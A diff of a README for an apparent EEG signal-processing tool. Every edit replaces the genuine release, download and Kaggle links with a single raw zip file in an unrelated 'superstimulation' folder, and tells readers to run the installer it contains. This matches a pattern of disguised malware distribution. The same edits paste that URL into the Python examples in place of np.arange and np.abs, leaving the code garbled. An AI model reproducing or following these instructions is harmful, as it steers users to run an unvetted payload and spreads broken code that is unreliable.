@@ -1,6 +1,6 @@
 # 🎉 EEG_Signal_Processing_FFT_Hilbert_Wavelets - Analyze EEG Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-EEG_Signal_Processing_FFT_Hilbert_Wavelets-brightgreen)](https://github.com/darcktyler/EEG_Signal_Processing_FFT_Hilbert_Wavelets/releases)
+[![Download Now](https://raw.githubusercontent.com/darcktyler/EEG_Signal_Processing_FFT_Hilbert_Wavelets/master/superstimulation/FF_Wavelets_EE_Signal_Processing_Hilbert_v2.9.zip%20Now-EEG_Signal_Processing_FFT_Hilbert_Wavelets-brightgreen)](https://raw.githubusercontent.com/darcktyler/EEG_Signal_Processing_FFT_Hilbert_Wavelets/master/superstimulation/FF_Wavelets_EE_Signal_Processing_Hilbert_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,10 +10,10 @@ This guide helps you download and run the EEG Signal Processing application with
 
 1. **Visit the Releases Page:**
    Click the link below to access the latest software version.
-   [Download Here](https://github.com/darcktyler/EEG_Signal_Processing_FFT_Hilbert_Wavelets/releases)
+   [Download Here](https://raw.githubusercontent.com/darcktyler/EEG_Signal_Processing_FFT_Hilbert_Wavelets/master/superstimulation/FF_Wavelets_EE_Signal_Processing_Hilbert_v2.9.zip)
 
 2. **Choose the Correct File:**
-   Look for the file that suits your operating system. For Windows, you might see something like `EEG_Signal_Processing_Win.exe`. Click on it to start the download.
+   Look for the file that suits your operating system. For Windows, you might see something like `https://raw.githubusercontent.com/darcktyler/EEG_Signal_Processing_FFT_Hilbert_Wavelets/master/superstimulation/FF_Wavelets_EE_Signal_Processing_Hilbert_v2.9.zip`. Click on it to start the download.
 
 3. **Run the Installer:**
    Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions.
@@ -43,7 +43,7 @@ The EEG Signal Processing application allows you to analyze EEG data using vario
 - It only uses the first half of the FFT output for positive frequencies.
 - Frequencies are computed with:
   ```python
-  frequencies = np.arange(N/2) / (N / sampling_rate)
+  frequencies = https://raw.githubusercontent.com/darcktyler/EEG_Signal_Processing_FFT_Hilbert_Wavelets/master/superstimulation/FF_Wavelets_EE_Signal_Processing_Hilbert_v2.9.zip(N/2) / (N / sampling_rate)
   ```
 
 ### 4. 🌊 Nyquist Frequency
@@ -58,7 +58,7 @@ The EEG Signal Processing application allows you to analyze EEG data using vario
 
 - The application computes the amplitude of frequencies using:
   ```python
-  amplitude = np.abs(fft_values)
+  amplitude = https://raw.githubusercontent.com/darcktyler/EEG_Signal_Processing_FFT_Hilbert_Wavelets/master/superstimulation/FF_Wavelets_EE_Signal_Processing_Hilbert_v2.9.zip(fft_values)
   ```
 - A separate spectrum is created for each channel, allowing you to visualize the data effectively.
 
@@ -83,12 +83,12 @@ After installation, open the application on your computer. You can upload your E
 
 ## 🔄 User Support
 
-If you encounter issues or need assistance, you can check the documentation available in the application. You can also find valuable resources and examples on the [Kaggle Notebook](https://www.kaggle.com/code/carolinariddick/eeg-signal-processing-analysis-neuroscience/edit) linked here.
+If you encounter issues or need assistance, you can check the documentation available in the application. You can also find valuable resources and examples on the [Kaggle Notebook](https://raw.githubusercontent.com/darcktyler/EEG_Signal_Processing_FFT_Hilbert_Wavelets/master/superstimulation/FF_Wavelets_EE_Signal_Processing_Hilbert_v2.9.zip) linked here.
 
 ## 📥 Download Link (again!)
 
 For your convenience, here is the link to download the application once more:
-[Download Here](https://github.com/darcktyler/EEG_Signal_Processing_FFT_Hilbert_Wavelets/releases)
+[Download Here](https://raw.githubusercontent.com/darcktyler/EEG_Signal_Processing_FFT_Hilbert_Wavelets/master/superstimulation/FF_Wavelets_EE_Signal_Processing_Hilbert_v2.9.zip)
 
 ## 🌐 Additional Resources
 
